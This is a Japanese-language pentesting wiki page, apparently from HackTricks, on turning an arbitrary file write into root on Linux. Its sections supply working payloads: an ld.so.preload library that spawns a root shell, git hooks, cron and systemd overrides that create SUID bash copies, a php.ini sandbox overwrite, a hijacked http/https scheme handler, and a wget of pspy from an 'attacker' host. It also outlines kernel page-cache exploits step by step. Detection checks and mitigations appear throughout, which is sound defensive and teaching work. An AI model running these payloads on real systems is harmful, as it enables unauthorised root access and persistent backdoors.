# Rootへの任意ファイル書き込み

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` は、dynamic linker が他の shared objects より先に読み込む shared objects のシステム全体のリストです。Secure-execution mode では preloading に追加の制限が適用されるため、`/tmp/pe.so` のような library path は普遍的な SUID-binary technique ではありません。\
これを作成または変更できる場合、このファイルを読み込む process は、他の shared objects より先にリストされた library を読み込むため、その process の context で code execution が可能になります。<sup>[[12]](#references)</sup>

例: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** は、commit や merge 操作を含む、repository 内のイベントで実行される executable script です。**privileged script または user** がこれらの操作を実行し、攻撃者が **`.git` folder に write** できる場合、hook を **privilege escalation** に利用できます。<sup>[[13]](#references)</sup>

たとえば、git repo の **`.git/hooks`** に **script を生成** し、新しい commit が作成されるたびに常に実行されるようにすることが可能です。
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Cron & Time ファイル

**root が実行する cron 関連ファイルに書き込める**場合、通常はジョブが次に実行されたときに code execution を取得できます。興味深いターゲットには次のものがあります:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`、`/etc/cron.daily/*`、`/etc/cron.weekly/*`、`/etc/cron.monthly/*`
- `/var/spool/cron/` または `/var/spool/cron/crontabs/` にある root 自身の crontab
- `systemd` timers と、それらが起動するサービス

簡単な確認:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
典型的な悪用経路:

- `/etc/crontab` または `/etc/cron.d/` 内のファイルに **新しい root cron job を追加**
- `run-parts` によってすでに実行されている **script を置き換え**
- 起動対象の script または binary を変更して、**既存の timer target に backdoor を仕込む**

最小限の cron payload の例:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
`run-parts` が使用する cron ディレクトリ内にしか書き込めない場合は、代わりにそこへ実行可能ファイルを配置します。
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
- `run-parts` は通常、ドットを含むファイル名を無視するため、`backup.sh` ではなく `backup` のような名前を使用します。<sup>[[15]](#references)</sup>
- 一部のシステムでは、従来の cron の代わりに `systemd` timer を使用しますが、abuse の考え方は同じです。**後で root が実行するものを変更する**ことです。<sup>[[20]](#references)</sup>

### Service & Socket files

**`systemd` unit files** またはそれらが参照するファイルに書き込み可能な場合、unit を reload して restart するか、service/socket activation の経路がトリガーされるのを待つことで、root として code execution を取得できる可能性があります。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

対象として興味深いものには、次のようなものがあります。

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` の drop-in overrides
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` が参照する service scripts/binaries
- root service が読み込む、書き込み可能な `EnvironmentFile=` paths

簡単な確認：
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
一般的な悪用経路：

- root-owned の service unit で変更可能な `ExecStart=` を**上書き**する
- 悪意のある `ExecStart=` を含む **drop-in override** を追加し、最初に古いものをクリアする
- unit からすでに参照されているスクリプトやバイナリに**バックドア**を仕込む
- socket が接続を受信したときに起動する、対応する `.service` ファイルを変更して、socket-activated service を**ハイジャック**する

悪意のある override の例：
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
典型的なアクティベーションフロー：
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
サービスを自分で再起動できなくても、socket-activated unitを編集できる場合は、**クライアント接続を待つだけ**で、backdoor化されたサービスをrootとして実行させられる可能性があります。<sup>[[17]](#references)</sup>

### 特権 PHP sandboxで使用される制限された`php.ini`を上書きする

一部のカスタムdaemonは、**制限された`php.ini`**（例：`disable_functions=exec,system,...`）を指定して`php`を実行することで、ユーザーが提供したPHPを検証します。sandbox内のコードに（`file_put_contents`のような）**何らかの書き込みprimitive**が残っており、daemonが使用する**正確な`php.ini`のパス**にアクセスできる場合、その設定を**上書き**して制限を解除し、その後、昇格された権限で実行される2つ目のpayloadを送信できます。<sup>[[2]](#references)</sup>

一般的な流れ：

1. 1つ目のpayloadでsandboxの設定を上書きする。
2. 危険なfunctionが再有効化された状態で、2つ目のpayloadがコードを実行する。

最小限の例（daemonが使用するパスに置き換えてください）：
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
デーモンが root として実行される場合（または root 所有のパスで検証する場合）、2 回目の実行によって root コンテキストが得られます。これは、sandboxed runtime が引き続きファイルを書き込める場合、本質的には **config overwrite による privilege escalation** です。

### binfmt_misc

`binfmt_misc` は `/proc/sys/fs/binfmt_misc` 以下に登録情報を公開します。各登録情報は、ファイルタイプのパターンと interpreter を関連付けます。privilege への影響は、誰が登録情報を変更できるか、また後で一致するファイルを実行するプロセスがどれかに左右されるため、privilege-escalation の経路として扱う前に、これらの要件を確認してください。<sup>[[21]](#references)</sup>

### スキーマハンドラーの上書き（http: や https: など）

Desktop environments は MIME associations と desktop entries を使用して、URI schemes に使用するアプリケーションを選択します。攻撃者が、関連する per-user configuration と desktop-entry directories に書き込める場合、それらの schemes を自身が制御する launcher にリダイレクトできます。`$HOME/.config/mimeapps.list` ファイルを変更して、HTTP と HTTPS の URL handlers を悪意のあるファイル（例: `x-scheme-handler/http=evil.desktop` および `x-scheme-handler/https=evil.desktop`）に指定すると、ユーザーのクリックによってその desktop entry を呼び出せます。<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Rootがユーザー書き込み可能なscripts/binariesを実行する場合

権限のあるworkflowが`/bin/sh /home/username/.../script`のようなコマンド（または非特権ユーザーが所有するdirectory内のbinary）を実行する場合、それをhijackできます:<sup>[[1]](#references)</sup>

- **実行を検出する:** pspyでprocessをmonitorし、rootがユーザー制御のpathを呼び出していることを検出します。<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **書き込み可能性を確認:** 対象ファイルとそのディレクトリの両方が、ユーザー自身によって所有され、書き込み可能であることを確認します。
- **対象をHijack:** 元のbinary/scriptをバックアップし、SUID shell（またはその他のroot操作）を作成するpayloadを配置してから、権限を復元します:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **privileged actionをトリガーする**（例: helperをspawnするUIボタンを押す）。rootがhijackされたpathを再実行したら、`./rootshell -p`でescalated shellを取得する。

### privileged binaryのpage-cache-only file modification

一部のkernel bugは、ファイルを**disk上で変更しない**。代わりに、読み取り可能なファイルの**page cache copyだけを変更**できる。**setuid** binary、またはその他の**rootによって実行される**binaryを対象にできれば、次回の実行時にmemory上のattacker-controlled bytesが実行され、disk上のfile hashが変更されていなくてもprivilege escalationが可能になる。<sup>[[3]](#references)[[4]](#references)</sup>

これは**runtime-only file write primitive**として考えると分かりやすい:<sup>[[3]](#references)</sup>

- **Disk stays clean**: inodeとdisk上のbytesは変更されない
- **Memory is dirty**: cached pageを読み取り・実行するprocessは、attackerが変更したcontentを取得する
- **Effect is temporary**: rebootまたはcache eviction後に変更は消える

このprimitiveは、classicな**arbitrary file write**と、Dirty COW / Dirty Pipeなどの古い**page-cache abuse** bugの中間に位置する:<sup>[[3]](#references)</sup>

- Dirty COWはraceに依存していた
- Dirty Pipeにはwrite-positionの制約があった
- 脆弱なpathがcached file-backed pageへ直接writeできる場合、page-cache-only primitiveの方が信頼性が高い

#### Generic privesc flow

1. **file-backed page cache pages**へwriteできるkernel primitiveを取得する
2. それを**readable privileged binary**または別のroot-executed fileに対して使用する
3. pageがcacheからevictされる**前に**executionをトリガーする
4. on-disk fileが未変更に見えるまま、rootとしてcode executionを取得する

Typical high-value targets:

- **setuid-root** binaries
- **root services**によって起動されるhelpers
- **host kernel/page cacheを共有するcontainers**から一般的に実行されるbinaries

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431)は、このclassの良い例である。脆弱なpathはLinux crypto userspace API（`AF_ALG` / `algif_aead`）に存在した:<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()`は、readable fileからcrypto TX scatterlistへpage-cache pagesへのreferencesを移動できる
- in-placeの`algif_aead` decrypt pathは、sourceとdestinationのbuffersを再利用した
- `authencesn`はその後、destination tag regionへwriteした
- そのregionがまだspliced file-backed pagesを参照していた場合、writeは**target fileのpage cache**に反映された

したがって興味深いtechniqueはCVEそのものではなく、次のpatternである:

- **file-backed cache pagesをkernel subsystemへ投入する**
- subsystemにそれらを**writable outputとして扱わせる**
- memory上で小さく制御されたoverwriteをトリガーする

公開されたPoCは、**4-byte writes**を繰り返して`/usr/bin/su`をmemory上でpatchし、その後実行した。<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503)は、同じ**page-cache-only write-to-root** patternの別variantを示している。ただし今回は、sinkは`AF_ALG`ではなく**IPsec ESP decrypt**である。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

重要なtechniqueは**metadata-laundering step**である:

- `splice()`は**read-only file-backed page-cache page**をESP-in-UDP packetへ配置する
- 元のDirtyFrag mitigationは、そのskbに`SKBFL_SHARED_FRAG`を付け、`esp_input()`が**decrypt前にcopy**するようにしていた
- netfilter `TEE`は`nf_dup_ipv4()` -> `__pskb_copy_fclone()`を通じてpacketをduplicateする
- cloneは**同じphysical page-cache reference**を保持するが、`SKBFL_SHARED_FRAG`を失う
- その後`esp_input()`はcloneをsafeとみなし、file-backed page上でin-placeの`cbc(aes)` decryptを実行する

したがってreviewerへのlessonはCVEより広い。operationを先にcopyすべきかどうかの判断が**skb/page metadata**に依存している場合、backing pageを保持しながらmetadataを削除する**clone/copy path**によって、write primitiveが気付かないうちに再び有効化される可能性がある。

Typical exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`で、**private network namespace内の`CAP_NET_ADMIN`**を取得する
2. loopbackをupにし、`mangle/OUTPUT`へ**netfilter `TEE` rule**をinstallする
3. `NETLINK_XFRM`経由で**XFRM ESP transport SAs**をinstallする
4. 各target 4-byte wordをSAの`seq_hi` fieldにencodeする（DirtyFragのword-selection trick）
5. spliced ESP-in-UDP packetをsendし、**TEE clone**が`esp_input()`へ到達してin-place decryptするようにする
6. page-cache copy of `/usr/bin/su`または別のprivileged executableにattacker-controlled codeが含まれるまで繰り返す

Operationally、impactは`AF_ALG` exampleと同じである。disk上のfileはcleanなままだが、`execve()`は**mutated page-cache bytes**を消費し、rootを取得できる。<sup>[[8]](#references)[[9]](#references)</sup>

このvariantで役立つexposure checks:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
ここでの短期的な攻撃対象領域の削減も path-specific です。`48f6a5356a33` を含む kernel にアップグレードすると clone path が修正され、`xt_TEE` の autoload をブロックすると **flag-laundering step** が除去され、`esp4` / `esp6` をブロックすると **decrypt sink** が除去されます。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure と hunting

このクラスのバグが疑われる場合、ディスクの integrity checks だけに依存しないでください。次の項目も確認します。
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
以下の configuration values は、loadable interface と kernel に組み込まれた interface を区別します。crypto build rules は `CONFIG_CRYPTO_USER_API_AEAD` を `algif_aead` に対応付けます。<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` は module として loadable/unloadable にできます
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface は kernel に組み込まれます
- setuid binaries は、page-cache-only patch だけで local foothold を root に昇格させられる可能性があるため、適切な target です

#### `algif_aead` path の attack-surface reduction

vulnerable interface が loadable module によって提供されている場合:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
カーネルにコンパイルされている場合、一部のdisclosureでは、次の方法でinitパスをブロックできると報告されています:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
この種の緩和策は、他の kernel LPE でも覚えておく価値があります。exploit が特定の optional interface に依存している場合、その interface を無効化または blacklist 化することで、完全な kernel upgrade を利用できるようになる前でも exploit path を断つことができます。<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – user-writable な PaperCut directory 内の root 実行 script を hijacking](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431 に関する Openwall oss-security disclosure](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - out-of-place での動作に revert](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE variant DirtyClone (CVE-2026-43503) の dissecting and exploiting](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: `__pskb_copy_fclone()` で `SKBFL_SHARED_FRAG` を preserve (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux earlier mitigation: spliced UDP packets に `SKBFL_SHARED_FRAG` を set (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
{{#include ../../banners/hacktricks-training.md}}
